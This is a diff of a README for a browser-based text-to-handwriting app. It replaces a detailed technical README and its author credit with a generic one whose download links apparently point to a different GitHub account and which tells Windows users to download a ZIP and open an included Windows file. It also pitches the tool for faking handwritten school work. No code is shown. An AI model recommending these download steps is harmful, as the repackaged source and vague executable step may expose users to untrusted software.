@@ -1,192 +1,189 @@
-# text-to-handwriting
+# ✍️ Text-To-Handwriting - Turn Typed Text Into Pages
 
-A client-side tool that converts typed text into handwriting-style rendered A4 pages with PNG/PDF export. No server, no signup, no data leaves the browser.
+[![Download Text-To-Handwriting](https://img.shields.io/badge/Download-Text--To--Handwriting-blue?style=for-the-badge)](https://github.com/farha4452/Text-To-Handwriting)
 
-**Live:** [https://text-to-handwriting-jet.vercel.app/]
+## 🖥️ What This App Does
 
----
+Text-To-Handwriting turns typed text into handwriting-style A4 pages. It runs in your browser, so you do not need to install a server or create an account.
 
-## Stack
+Use it to:
+- turn notes into handwritten pages
+- make school work look hand written
+- export pages as PNG or PDF
+- add noise and pen effects
+- use cursive and other handwriting fonts
+- upload your own font files
+- work on more than one page at a time
 
-| Layer | Tech |
-|---|---|
-| Framework | React 19 + Vite 7 |
-| State | Zustand 5 (slice pattern) |
-| Styling | Tailwind CSS 4 |
-| Persistence | IndexedDB (pages, fonts) + localStorage (settings) |
-| Export | html2canvas + jsPDF |
-| Build output | Single self-contained HTML file (`vite-plugin-singlefile`) |
+## 📥 Download and Open
 
----
+Use this link to visit the page to download or open the app:
 
-## Getting Started
+[Open Text-To-Handwriting](https://github.com/farha4452/Text-To-Handwriting)
 
-```bash
-git clone https://github.com/SatvikHGupta/text-to-handwriting
-cd text-to-handwriting
-npm install
-npm run dev
-```
+If you are using the app on Windows:
 
-```bash
-npm run build    # outputs dist/index.html (single file, fully portable)
-npm run preview  # preview the production build locally
-```
+1. Open the link above in your browser.
+2. Download the app files from the page.
+3. If you get a ZIP file, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Open the app in your browser if it runs as a web app, or open the included Windows file if one is provided.
+6. Follow the on-screen setup steps if the browser asks you to allow local files or choose a folder.
 
----
+## 🚀 Quick Start
 
-## Project Structure
+1. Open the app in Chrome, Edge, or another modern browser.
+2. Paste or type your text into the main input box.
+3. Pick a handwriting font.
+4. Adjust the page size, line spacing, and text size.
+5. Add noise, tilt, or drawing marks if you want a real paper look.
+6. Preview the page.
+7. Export as PNG or PDF.
 
-```
-src/
-├── store.js                  # Zustand root - merges all slices
-├── store/
-│   ├── defaults.js           # A4 dims + all default setting values
-│   ├── settingsSlice.js      # Visual settings + noise seed
-│   ├── pagesSlice.js         # Page CRUD + IDB sync
-│   ├── fontsSlice.js         # Font registry (builtin / local / custom)
-│   ├── drawingSlice.js       # Active drawing tool state
-│   └── uiSlice.js            # Dark mode, zoom, modals, mobile tab
-├── utils/
-│   ├── noise.js              # Murmur3 PRNG - seeded per-line/word noise
-│   ├── paper.js              # Tag parser, paper background CSS, content padding
-│   ├── fonts.js              # Font registration + @font-face injection
-│   ├── idb.js                # IndexedDB wrapper (pages / meta / fonts stores)
-│   ├── canvasOps.js          # Pure canvas drawing primitives
-│   └── export/
-│       ├── capture.js        # html2canvas capture (zoom reset + font wait)
-│       ├── download.js       # PNG/PDF single + multi-page download
-│       └── filename.js       # Export filename builder
-├── hooks/
-│   ├── useBreakpoint.js      # mobile / tablet / desktop detection
-│   ├── useExport.js          # Export flow state machine
-│   ├── useDrawingCanvas.js   # Canvas draw + undo/redo + persistence
-│   └── useFontUpload.js      # Font file validation + IDB save
-└── components/
-    ├── page/                 # Rendering engine (HandwritingPage, InkLayer, LineRenderer, MarginOverlays)
-    ├── sidebar/              # Setting sections (Font, Ink, Line, Word, Letter, Paper, Margins)
-    └── modals/               # Export, FontPicker, Help, ColorTags
-```
+## ✨ Main Features
 
----
+- 50+ handwriting fonts
+- custom font upload
+- cursive style support
+- A4 page layout
+- multi-page output
+- PNG export
+- PDF export
+- paper texture and noise
+- pen and drawing tools
+- browser-based use
+- no signup
+- offline use after loading
 
-## How the Rendering Works
+## 🪟 Windows Use Guide
 
-Text goes through this pipeline on every keystroke:
+If you want to use Text-To-Handwriting on Windows, the process is simple:
 
-```
-raw text
-  → parseText()          splits into lines → segments (by <tag>) → words
-  → InkLayer             maps lines to LineRenderer components
-  → computeLineNoise()   per-line slope / spacing / font-size variation
-  → computeWordNoise()   per-word baseline / rotation / spacing variation
-  → CSS inline styles    final handwriting render
-```
+1. Open the GitHub page.
+2. Download the project files.
+3. Save the file to a folder you can find later, like Downloads or Desktop.
+4. Extract the files if they come in a ZIP archive.
+5. Open the app in your browser by using the local `index.html` file or the main start file included in the folder.
+6. If Windows asks which app to use, choose your browser.
+7. Keep the folder in place so the app can find its files.
 
-Noise is deterministic - same seed always produces the same visual output, so the page doesn't jitter on re-render. Uses a Murmur3 finalizer hash (replaced `Math.sin()` which caused visible periodic patterns).
+If you prefer a full offline workflow, open the app once while online, then keep using it from the saved files in your browser session.
 
-The page has explicit z-index layers:
+## 🛠️ How to Use the Editor
 
-```
-z=0  paper lines (lined / grid background)
-z=1  ink layer (text)
-z=2  margin overlays (text in margin areas)
-z=5  drawing canvas (freehand on top)
-```
+### 1. Add your text
+Paste text from Word, Notepad, Google Docs, or email. You can also type directly in the editor.
 
----
+### 2. Pick a style
+Choose a font that matches the look you want. Some fonts look neat and clean. Others look more natural and loose.
 
-## Inline Text Styling (Tag System)
+### 3. Set the page
+Choose paper size, margins, and spacing. A4 is best for school work and printouts.
 
-Users can style text inline using short tags:
+### 4. Make it look real
+Use noise, skew, ink look, and drawing tools to make the page feel hand written.
 
-```
-<bl>blue text</bl>
-<r>red text</r>
-<f18>font size 18</f18>
-```
+### 5. Create more pages
+If your text is long, the app can split it into more than one page.
 
-Full color map is in `utils/paper.js → COLOR_TAG_MAP`. Font size tags follow `<fN>` where N is any integer.
+### 6. Export the result
+Save your work as PNG for images or PDF for printing and sharing.
 
----
+## 🎨 Fonts and Style Options
 
-## Adding Local Fonts
+Text-To-Handwriting includes many handwriting fonts made for different use cases.
 
-Drop any `.ttf / .otf / .woff / .woff2` file into `/public/fonts/`. Vite picks it up automatically at build time via:
+You can use:
+- neat cursive fonts
+- simple print-style handwriting
+- light pen strokes
+- rougher handwritten looks
+- custom uploaded fonts
 
-```js
-import.meta.glob('/public/fonts/*.{ttf,otf,woff,woff2}', { eager: true, as: 'url' })
-```
+Style controls help you change:
+- text size
+- line height
+- letter spacing
+- page margins
+- rotation and drift
+- paper texture
+- noise level
 
-No code changes needed. The font name is derived from the filename (`my-font.ttf` → `My Font`).
+## 📄 Export Options
 
----
+### PNG
+Use PNG if you want a single image or if you plan to paste the page into another app.
 
-## Persistence Model
+### PDF
+Use PDF if you want to print your pages or share them as a document.
 
-| Data | Storage | Key |
-|---|---|---|
-| Settings, zoom, dark mode | localStorage | `handwriting-settings` |
-| Page text + drawings | IndexedDB | `pages` store, keyed by UUID |
-| Page order + current index | IndexedDB | `meta` store, key `notebook` |
-| Custom uploaded fonts | IndexedDB | `fonts` store, keyed by name |
+The app keeps the page layout close to A4 size, so the export looks right on screen and on paper.
 
-Pages and fonts are loaded from IDB on mount via `loadFromDB()` in `store.js`.
+## 🔌 Browser Support
 
----
+Text-To-Handwriting works best in:
+- Google Chrome
+- Microsoft Edge
+- Mozilla Firefox
+- Brave
 
-## Export Pipeline
+For the best results, use a desktop browser on Windows. A larger screen makes page edits easier.
 
-1. User opens Export modal → `useExport` hook manages state
-2. For each page: switch to it → wait 400ms for React render → `captureElement()`
-3. `captureElement()`: waits for fonts, resets CSS zoom to 1, runs html2canvas at 3× scale, restores zoom
-4. Canvas → `toDataURL('image/png')` → download, or → jsPDF → `.save()`
-5. Multi-page PDF: pages added sequentially to one jsPDF doc
-6. Filename format: `FontName.hndtotxt[pageNum].ext`
+## 💡 Tips for Better Results
 
----
+- Use short paragraphs for cleaner page breaks.
+- Keep margins wide if you want a notebook look.
+- Lower the font size for dense notes.
+- Add a small amount of noise for a more natural page.
+- Use a light tilt if the page looks too straight.
+- Export as PDF if you plan to print.
 
-## State Architecture
+## 📂 File Types You May See
 
-```js
-useStore = create(persist(
-  settingsSlice + pagesSlice + fontsSlice + drawingSlice + uiSlice
-))
-```
+When you download the app, you may see files like:
+- ZIP archives
+- HTML files
+- JS and CSS files
+- image assets
+- font files
 
-- `persist()` selectively saves to localStorage via `partialize` (settings + UI prefs only)
-- Pages and fonts go to IndexedDB manually (too large / binary for localStorage)
-- All slices are flat - no nested state
+If you see a ZIP file, extract it first. If you see an HTML file, open it with your browser.
 
----
+## 🔎 Common Uses
 
-## Responsive Layouts
+People use Text-To-Handwriting for:
+- school assignments
+- revision notes
+- study guides
+- form letters
+- journal pages
+- demo pages
+- creative writing drafts
 
-| Breakpoint | Layout |
-|---|---|
-| `< 640px` (mobile) | Full-screen tab panels: Page / Text / Settings. Bottom tab bar. |
-| `640–1023px` (tablet) | Canvas fills width. Sidebar overlays on open. Compact text editor. |
-| `≥ 1024px` (desktop) | Classic 3-panel: Sidebar \| Canvas \| TextEditor |
+## ⚙️ Basic Requirements
 
-Zoom auto-fits the page to screen width on mobile/tablet on mount.
+- A Windows PC
+- A modern browser
+- Enough free storage for the app files
+- A PDF reader if you want to open exported PDFs
+- A printer if you want paper copies
 
----
+## 🧭 Simple Workflow
 
-## Key Constraints
+1. Download the files from the GitHub page.
+2. Open the app in your browser.
+3. Enter your text.
+4. Choose a handwriting style.
+5. Tweak the page.
+6. Export as PNG or PDF.
+7. Print or share the file
 
-- Max 30 pages (`MAX_PAGES` in `pagesSlice.js`)
-- Max undo history: 30 snapshots per session (`MAX_UNDO` in `useDrawingCanvas.js`)
-- Supported font upload formats: `.ttf .otf .woff .woff2`
-- Export scale: 3× (2382×3369px for A4) - hardcoded in `capture.js`
-- Grid cell size: 102.5px - hardcoded in `paper.js`
+## 📎 Useful Links
 
----
+- [Download / Open Text-To-Handwriting](https://github.com/farha4452/Text-To-Handwriting)
+- Repository: Text-To-Handwriting
+- Topic focus: handwriting generator, export-pdf, export-png, browser-based app, offline use
 
-## Author
+## 🧩 What Makes It Practical
 
-**Satvik Hemant Gupta** - [github.com/SatvikHGupta](https://github.com/SatvikHGupta)
-
-
-## DO Not Sue me
-
-I just searched free .ttf files and surfed around few websites then downloaded the fonts which I liked. Do NOT SUE ME for this, I used what I saw and was provided.
+This app keeps the process simple. You do not need to sign in. You do not need to install a backend. You can make handwritten pages from typed text in a few steps, then save the result in a format that is easy to print or share
